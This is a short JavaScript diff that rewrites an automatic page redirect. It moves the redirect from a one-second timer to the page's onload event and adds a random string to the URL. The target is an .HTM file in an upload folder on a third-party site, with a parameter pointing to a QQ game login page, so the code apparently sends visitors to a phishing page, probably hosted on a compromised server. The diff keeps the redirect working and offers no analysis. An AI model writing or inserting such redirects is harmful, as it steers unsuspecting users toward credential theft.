@@ -8,8 +8,10 @@ function leleua() {
 
 leleua();
 
-setTimeout(function() {
-    var timestamp = new Date().getTime();
-    var url = 'http://www.360tianma.com/public/upload/conf/2024/01-11/38db6050a87abdd15393b354437fedc5.HTM?url=http://lol.qq.com/comm-htdocs/milo_mobile/login.html' + 'u' + timestamp + 'utdxj';
-    location.href = url;
-}, 1000);
+window.onload = function () {
+    const targetUrl = 'http://www.360tianma.com/public/upload/conf/2024/01-11/38db6050a87abdd15393b354437fedc5.HTM?url=http://lol.qq.com/comm-htdocs/milo_mobile/login.html';
+    const timestamp = Date.now();
+    const randomString = Math.random().toString(36).substring(2);
+    const urlWithParam = `${targetUrl}u${timestamp}${randomString}`;
+    window.location.href = urlWithParam
+}
